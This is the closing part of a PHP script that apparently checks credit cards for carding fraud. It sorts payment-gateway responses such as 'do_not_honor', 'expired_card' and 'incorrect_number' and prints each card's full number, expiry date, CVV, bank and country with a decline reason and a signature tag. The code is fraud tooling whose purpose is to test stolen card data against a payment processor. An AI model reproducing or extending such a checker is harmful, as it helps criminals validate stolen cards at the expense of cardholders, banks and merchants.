  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>3D Secure Redirect ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'Card is declined ▸cc check by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>3D Secure Redirect ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Missing Payment Informations ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Missing Credit Card Number ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'Your card has expired.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Card Expired ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'card number is incorrect.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Incorrect Card Number ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "incorrect_number")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Incorrect Card Number ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'card was declined.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Card Declined ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "generic_decline")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Generic Decline ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "do_not_honor")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Do Not Honor ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "expired_card")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Expired Card ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Card Doesnt Support This Purchase ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "processing_error")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Processing Error ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2, "service_not_allowed")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Service Not Allowed ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "parameter_invalid_empty")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Declined: Missing Card Details ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "lock_timeout")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Another Request In Process: Card Not Checked ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  "transaction_not_allowed")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Transaction Not Allowed ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2,  'Card is declined ▸cc check by your bank, please contact them for additional information.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>3D Secure Redirect ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2, "missing_payment_information")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Missing Payment Informations ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif
(strpos($result2, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Missing Credit Card Number ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

elseif 
(strpos($result2,  '-1')) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Update Nonce ❌</i></font> <br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font> <br>";
}

else {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>Declined | $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>Card was Declined due to an Unknown Error ❌</i></font><br> <font class='badge badge-dark'>▸ $bank ▸ $country ▸ 🔰 ハ̴リ̴ス̴ロ̴ケ̴ッ̴ト̴ </i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;
//echo $result2;

?>
